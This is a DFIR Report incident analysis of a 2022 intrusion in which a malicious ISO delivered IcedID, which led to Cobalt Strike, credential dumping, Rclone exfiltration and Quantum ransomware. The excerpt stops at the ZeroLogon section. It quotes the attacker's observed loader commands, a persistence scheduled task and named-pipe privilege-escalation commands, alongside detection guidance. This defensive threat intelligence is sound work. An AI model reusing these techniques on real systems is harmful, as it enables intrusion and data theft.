<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<div class="clock">
<div id="time"></div>
<div id="date">Thursday, October 24, 2024</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
</div>
</div>
</header>
<div id="content" class="site-content">
<div class="site-content-cell">
<div class="wrap wrap-width">
<div id="primary" class="content-area">
<main id="main" class="site-main">
<article id="post-16873" class="post-16873 post type-post status-publish format-standard hentry category-adfind category-cobaltstrike category-icedid category-quantum category-ransomware category-rclone category-sharefinder entry">
<div class="entry-content-holder">
<header class="entry-header">
<div class="entry-meta">
<span class="cat-links">
<a class="category-color-24" href="https://thedfirreport.com/category/adfind/">adfind</a>
<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
<a class="category-color-67" href="https://thedfirreport.com/category/icedid/">icedid</a>
<a class="category-color-93" href="https://thedfirreport.com/category/quantum/">quantum</a>
<a class="category-color-2" href="https://thedfirreport.com/category/ransomware/">ransomware</a>
<a class="category-color-110" href="https://thedfirreport.com/category/rclone/">rclone</a>
<a class="category-color-101" href="https://thedfirreport.com/category/sharefinder/">ShareFinder</a>
</span>
</div>
<h1 class="entry-title">Malicious ISO File Leads to Domain Wide Ransomware</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/" rel="bookmark"><time class="entry-date published" datetime="2023-04-03T01:27:10+00:00">April 3, 2023</time></a></span> </div>
</header>
<div class="entry-content">
<p>IcedID continues to deliver malspam emails to facilitate a compromise. This case covers the activity from a campaign in late September of 2022. Post exploitation activities detail some familiar and some new techniques and tooling, which led to  domain wide ransomware.</p>
<p>This case shares similarities of the IcedID campaign detailed by <a href="http://Malware-Traffic-Analysis.net" target="_blank" rel="noreferrer noopener">Malware-Traffic-Analysis.net</a>, where the ADGet.exe <a href="https://www.malware-traffic-analysis.net/2022/09/23/index.html">application was referenced</a>.</p>
<h2 id="services" class="wp-block-heading"><a href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/#services">Services</a></h2>
<ul>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noopener">Private Threat Briefs</a>:</strong> Over 25 private reports annually, such as this one but more concise and quickly published post-intrusion.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noopener">Threat Feed</a>:</strong> Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noopener">All Intel</a>:</strong> Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.</li>
<li><strong><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noopener">Private Sigma Ruleset</a>:</strong> Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>
<li><strong><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>:</strong> Offers cloud-based, hands-on learning experiences using real data from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>
<p>Contact us today for a demo!</p>
<h2 class="wp-block-heading" id="case-summary"><a href="#case-summary">Case Summary</a></h2>
<p>This intrusion began by the execution of IcedID malware contained within an ISO image. The ISO file was delivered to the victim as part of a malspam campaign. Delivering payloads using an ISO image is a common technique observed in several prior cases. This technique has <a href="https://redcanary.com/blog/iso-files/" target="_blank" rel="noreferrer noopener">grown in use</a> as threat actors look to evade <a href="https://attack.mitre.org/techniques/T1553/005/" target="_blank" rel="noopener">Mark-of-the-Web</a> controls.</p>
<p>The ISO image delivered a hidden directory containing a IcedID payload and a batch file. After being successfully mounted (double clicked), the end user only sees a malicious LNK file named documents inside the virtual hard drive. Clicking on the LNK file executes the batch file, which copies the IcedID payload to the user’s AppData\Local\Temp folder and loads it using rundll32. A scheduled task was created at that time to maintain persistence on this host as well.</p>
<p>Upon the execution of the IcedID payload, discovery commands using Windows utilities such as net, nltest, and ipconfig were executed to discover domain trusts, domain admins, workstation configuration, etc. Around 16 hours after the initial execution, the first Cobalt Strike beacon DLL was executed from the IcedID malware. This led to another round of discovery using net followed by <a href="https://thedfirreport.com/2020/05/08/adfind-recon/" target="_blank" rel="noreferrer noopener">AdFind</a>.</p>
<p>The threat actor installed Atera and Splashtop remote access software via an MSI file. After that, the threat actors tried a GetSystem privilege escalation technique, which was blocked by antivirus. The threat actor then proceeded to exploit CVE-2020-1472 (ZeroLogon). This was followed by a batch script used to perform DNS lookups on hosts across the environment. After this, the threat actors began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it via a remote service. They then repeated the install of the remote access software package.</p>
<p>Some two hours later, another Cobalt Strike beacon was executed. With this beacon, the threat actors succeeded in elevating to SYSTEM on the beachhead host and proceeded to dump LSASS memory. Another round of activity took place using system tools, batch files, and Adget. Several more beacons were also loaded on the host using DLLs and PowerShell.</p>
<p>At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving laterally to other systems. They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons. These actions, however, failed to get a beacon to launch on the domain controller being targeted. After an hour or so of failures, the threat actors proceeded to RDP into the domain controller. Once there, they then loaded textbin[.]net, a pastebin style site, to download Cobalt Strike PowerShell code to the host in a file named pon.txt.</p>
<p>Trying to execute this locally failed as well, and the threat actor moved on to downloading a variety of beacon executables (e.g. lsass.exe, lsasss.exe, etc.). These beacons, however, continued to crash and fail to run. Around an hour after starting the RDP session, the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host and reviewed Group Policy Objects for the domain. The Cobalt Strike beacons then began to execute successfully on the domain controller. Now, with Cobalt Strike beacons on the domain controller, the threat actors continued with discovery actions using Invoke-ShareFinder and other PowerShell and system utilities.</p>
<p>A few hours after, the threat actors installed the <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools">RSAT tools</a> onto the beachhead host. However, they appear to have been unfamiliar with the tools and called up the help menu before using Get-ADComputer to collect the details on hosts in the environment. Back on the domain controller, ProcDump was used to dump LSASS memory. The PowerShell command Get-EventLog was then used to collect logon events on all domain administrators in the network.</p>
<p>The threat actors went quiet for around seven hours. When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation. For the next several hours, repeats of previous discovery actions and additional beacons executed using remote WMIC commands, were observed. During this time, Windows event logs point to the threat actors completing DCSync activities on one of the domain controllers. A new batch file, localdisk.bat, was also executed using remote WMI commands, to collect disk data on hosts around the environment. These discovery actions were completed several times again in other various batch files.</p>
<p>On the start of the fourth day, the threat actors continued to repeat their previous discovery and beacon spreading activity. Near the end of the day, the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control. Next, the threat actor executed PowerShell to pop up an alert message on several hosts, letting the user know that the machine was infected with Cobalt Strike.</p>
<p>After completing this activity, they used Rclone to exfiltrate copies of the backup files to the <a href="https://Mega.io" target="_blank" rel="noreferrer noopener">Mega.io</a> cloud storage service. The threat actors then staged a ransomware binary on the backup server but did not immediately execute it.</p>
<p>Around two hours after dropping the file, it was executed using a command line argument, which included a list of hosts to target. This appeared to fail. The threat actors then proceeded to execute the payload manually in several ways, across various hosts. Finally, they connected to a domain controller and dropped three scripts; one to copy the ransomware executable to all hosts, one to reset every users password in the organization, and a final one to execute the staged ransomware payload using PsExec.</p>
<p>Once executed, the ransomware left the ransom note README_TO_DECRYPT.html, which informs the victim that Quantum ransomware is responsible for the intrusion. The time to ransomware was just over 78 hours from the initial IcedID infection. All domain joined systems were encrypted with Quantum ransomware.</p>
<h2 class="wp-block-heading">Analysts</h2>
<figure class="wp-block-image"></figure>
<p>Analysis and reporting completed by <a href="https://twitter.com/_pete_0" target="_blank" rel="noreferrer noopener">@_pete_0</a> and <a href="https://twitter.com/MetallicHack" target="_blank" rel="noreferrer noopener">@MetallicHack</a>.</p>
<h2 class="wp-block-heading" id="initial-access"><a href="#initial-access">Initial Access</a></h2>
<p>This intrusion began by the execution of a malicious LNK embedded in an ISO file (masquerading as a folder). The ISO file was delivered as a ZIP archive via a malicious spam mail campaign.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-001.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-16881" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-001.png" alt width="2255" height="1290" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-001.png 2255w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-001-300x172.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-001-1024x586.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-001-768x439.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-001-1536x879.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-001-2048x1172.png 2048w" sizes="(max-width: 2255px) 100vw, 2255px" /></a></p>
<h3 class="wp-block-heading">Malicious ISO file</h3>
<p>First, the user clicked on the ISO file, which created a new virtual hard drive disk. Such activity can be tracked with Event 12 from Microsoft-Windows-VHDMP/Operational.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-002.png"><img decoding="async" class="aligncenter size-full wp-image-16882" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-002.png" alt width="1587" height="565" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-002.png 1587w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-002-300x107.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-002-1024x365.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-002-768x273.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-002-1536x547.png 1536w" sizes="(max-width: 1587px) 100vw, 1587px" /></a></p>
<p>This ISO file contains a LNK named documents and a hidden directory named max containing a cobalt strike DLL beacon and a batch file.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-003.png"><img decoding="async" class="aligncenter size-full wp-image-16883" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-003.png" alt width="774" height="386" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-003.png 774w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-003-300x150.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-003-768x383.png 768w" sizes="(max-width: 774px) 100vw, 774px" /></a></figure>
<p>As we can see below using LECmd by Eric Zimmerman, the file documents.lnk points to max\eyewear.bat.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16885" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-004.png" alt width="855" height="1260" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-004.png 855w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-004-204x300.png 204w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-004-695x1024.png 695w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-004-768x1132.png 768w" sizes="(max-width: 855px) 100vw, 855px" /></a></p>
<p>As a consequence, when the victim clicked on the LNK file, it triggered the execution of the batch file eyewear.bat</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16887" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-005.png" alt width="1600" height="534" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-005.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-005-300x100.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-005-1024x342.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-005-768x256.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-005-1536x513.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<p>The batch file eyewear.bat then executed two commands:</p>
<p>It first moved a DLL file named eyewear.dat, initially located in a hidden folder named max, to the user&#8217;s AppData\Local\Temp\ folder :</p>
<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /c D:\max\eyewear.bat
	➝ xcopy  /s /i /e /h max\easygoing.dat C:\Users\[REDACTED]\AppData\Local\Temp\*</pre>
<p>Then, DLL was executed using rundll32.exe :</p>
<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /c D:\max\eyewear.bat
	➝ rundll32 C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,#1</pre>
<p>Want to block ISOs from automatically mounting when double clicked? Check out <a href="https://www.huntress.com/blog/addressing-initial-access" target="_blank" rel="noopener">Huntress&#8217;s recent writeup</a>.</p>
<h2 class="wp-block-heading" id="execution"><a href="#execution">Execution</a></h2>
<p>On the second day of the intrusion, the threat actors used the IcedID malware to drop a Cobalt Strike beacon and execut it using regsvr32.exe.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16888" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-006.png" alt width="812" height="459" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-006.png 812w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-006-300x170.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-006-768x434.png 768w" sizes="(max-width: 812px) 100vw, 812px" /></a></p>
<p>After beginning to move laterally, the threat actors used many other execution techniques such as PowerShell and executables run from their interactive RDP session in addition to DLLs.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16889" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-007.png" alt width="808" height="478" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-007.png 808w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-007-300x177.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-007-768x454.png 768w" sizes="(max-width: 808px) 100vw, 808px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16890" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-008.png" alt width="798" height="460" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-008.png 798w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-008-300x173.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-008-768x443.png 768w" sizes="(max-width: 798px) 100vw, 798px" /></a></p>
<p>A number of application crashes were observed across several compromised hosts. This activity was a result of the threat actors attempting to execute various dropped tools or beacons on the endpoint, triggering a Windows Error Reporting (WER) fault process.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16891" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-009.png" alt width="856" height="262" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-009.png 856w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-009-300x92.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-009-768x235.png 768w" sizes="(max-width: 856px) 100vw, 856px" /></a></p>
<p>Application crashes are recorded in the Windows Application event log under Event ID 1000 and 1001.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16892" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-010.png" alt width="1222" height="1115" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-010.png 1222w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-010-300x274.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-010-1024x934.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-010-768x701.png 768w" sizes="(max-width: 1222px) 100vw, 1222px" /></a></p>
<p>The <a href="https://github.com/nsacyber/Event-Forwarding-Guidance/blob/master/Events/README.md" target="_blank" rel="noopener">NSA Cyber Windows Event Monitoring Guidance</a>, has the following statement:</p>
<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Application crashes may warrant investigation to determine if the crash is malicious or benign.</p>
</blockquote>
<p>In this case, the threat actors attempted to rectify the issue by deploying new beacons, renaming executable files by either appending a double extension or adding extra characters to the filename (i.e. lsass.exe to lsasss.exe).</p>
<p>Some of these crashes may have been in response to being detected by Microsoft Defender. These signatures were found in the logs on various hosts.</p>
<ul class="wp-block-list">
<li>HackTool:Win32/NamedPipeImpers.A</li>
<li>TrojanDropper:PowerShell/Cobacis.B</li>
<li>VirTool:MSIL/Menace.C!MTB</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16893" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-011.png" alt width="796" height="453" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-011.png 796w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-011-300x171.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-011-768x437.png 768w" sizes="(max-width: 796px) 100vw, 796px" /></a></p>
<p>There was evidence that that the Cobalt Strike aggressor script AnnoyKit was leveraged to launch Internet Explorer via a COM object.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16894" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-012.png" alt width="805" height="64" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-012.png 805w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-012-300x24.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-012-768x61.png 768w" sizes="(max-width: 805px) 100vw, 805px" /></a></p>
<p>Decoded from Base64:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16895" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-013.png" alt width="619" height="44" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-013.png 619w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-013-300x21.png 300w" sizes="(max-width: 619px) 100vw, 619px" /></a></p>
<p>The decoded PowerShell function is readable in the PowerShell logs:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16896" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-014.png" alt width="576" height="431" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-014.png 576w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-014-300x224.png 300w" sizes="(max-width: 576px) 100vw, 576px" /></a></p>
<p>The PowerShell script used is publicly available, and can be found <a href="https://github.com/Und3rf10w/Aggressor-scripts/blob/master/kits/AnnoyKit/scripts/Open-HiddenInternetExplorer.ps1" target="_blank" rel="noopener">here</a>, along with the CNA script.</p>
<p>We were unable to ascertain the purpose of running this script or how it furthered the threat actor&#8217;s goals.</p>
<h2 class="wp-block-heading" id="persistence"><a href="#persistence">Persistence</a></h2>
<p>IcedID created a DLL named Utucka.dll just after the initial execution.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16897" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-015.png" alt width="1145" height="277" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-015.png 1145w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-015-300x73.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-015-1024x248.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-015-768x186.png 768w" sizes="(max-width: 1145px) 100vw, 1145px" /></a></p>
<p>A scheduled task was then created using this same DLL.</p>
<pre class="wp-block-preformatted">&lt;?xml version="1.0" encoding="UTF-16"?&gt;
&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
  &lt;RegistrationInfo&gt;
    &lt;URI&gt;\{3A79715D-4FFB-50BE-8F3A-090CE7FB4097}&lt;/URI&gt;
  &lt;/RegistrationInfo&gt;
  &lt;Triggers&gt;
    &lt;TimeTrigger id="TimeTrigger"&gt;
      &lt;Repetition&gt;
        &lt;Interval&gt;PT1H&lt;/Interval&gt;
        &lt;StopAtDurationEnd&gt;false&lt;/StopAtDurationEnd&gt;
      &lt;/Repetition&gt;
      &lt;StartBoundary&gt;2012-01-01T12:00:00&lt;/StartBoundary&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;/TimeTrigger&gt;
    &lt;LogonTrigger id="LogonTrigger"&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
      &lt;UserId&gt;[REDACTED]&lt;/UserId&gt;
    &lt;/LogonTrigger&gt;
  &lt;/Triggers&gt;
  &lt;Principals&gt;
    &lt;Principal id="Author"&gt;
      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
      &lt;UserId&gt;[REDACTED]&lt;/UserId&gt;
      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;
    &lt;/Principal&gt;
  &lt;/Principals&gt;
  &lt;Settings&gt;
    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;
    &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;
    &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;
    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;
    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
    &lt;IdleSettings&gt;
      &lt;Duration&gt;PT10M&lt;/Duration&gt;
      &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;
      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
    &lt;/IdleSettings&gt;
    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
    &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;Hidden&gt;false&lt;/Hidden&gt;
    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
    &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;
    &lt;Priority&gt;7&lt;/Priority&gt;
  &lt;/Settings&gt;
  &lt;Actions Context="Author"&gt;
    &lt;Exec&gt;
      &lt;Command&gt;rundll32.exe&lt;/Command&gt;
      &lt;Arguments&gt;"C:\Users\[REDACTED]\AppData\Local\[REDACTED]\[REDACTED]\Utucka.dll",#1 --oxoj="CategoryBeyond\license.dat"&lt;/Arguments&gt;
    &lt;/Exec&gt;
  &lt;/Actions&gt;
&lt;/Task&gt;</pre>
<p>First execution was observed on Day 1 at 8:00 PM and was repeated every hour.</p>
<pre class="wp-block-preformatted">C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
  ➝ rundll32.exe "C:\Users\[REDACTED]\AppData\Local\[REDACTED]\[REDACTED]\Utucka.dll",#1 --oxoj="CategoryBeyond\license.dat"</pre>
<h2 class="wp-block-heading" id="privilege-escalation"><a href="#privilege-escalation">Privilege Escalation</a></h2>
<h3 class="wp-block-heading">Named pipe impersonation</h3>
<p>The named pipe impersonation technique was used multiple times on different hosts in order to get system privileges. This is a common technique used by threat actors, and implemented by the GetSystemCobalt Strike command. As seen in the screenshot below, GetSystem creates a service and connects to a pipe.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16898" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-016.png" alt width="937" height="383" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-016.png 937w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-016-300x123.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-016-768x314.png 768w" sizes="(max-width: 937px) 100vw, 937px" /></a></p>
<pre class="wp-block-preformatted">cmd.exe /c echo nbproc &gt; \\.\pipe\nbproc
cmd.exe /c echo xgxfpw &gt; \\.\pipe\xgxfpw
cmd.exe /c echo ylfdup &gt; \\.\pipe\ylfdup</pre>
<p>The beacon creates the named pipe (seen in Sysmon EventID 17) and impersonates the <em>NT AUTHORITY\SYSTEM</em> account used to connect to the pipe.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16899" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-017.png" alt width="1022" height="340" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-017.png 1022w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-017-300x100.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-017-768x255.png 768w" sizes="(max-width: 1022px) 100vw, 1022px" /></a></p>
<p>The MITRE Cyber Analytics Repository (CAR) details the Get System elevation, <a href="https://car.mitre.org/analytics/CAR-2021-02-002/" target="_blank" rel="noopener">CAR-2021-02-002: Get System Elevation</a></p>
<h3 class="wp-block-heading">Winlogon Token Impersonation/Theft</h3>
<p>Multiple access to WinLogon with granted access 0x40 (PROCESS_DUP_HANDLE) were performed. Such access can be tracked with Sysmon event ID 10 (ProcessAccess). As explained in <a href="https://jsecurity101.medium.com/bypassing-access-mask-auditing-strategies-480fb641c158" target="_blank" rel="noreferrer noopener">this blog written by Jonathan JOHNSON</a>, opening a handle to WinLogon in order to duplicate the token and call ImpersonateLoggedOnUser is a known Cobalt Strike technique.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16900" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-018.png" alt width="1600" height="386" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-018.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-018-300x72.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-018-1024x247.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-018-768x185.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-018-1536x371.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<h3 class="wp-block-heading">ZeroLogon</h3>
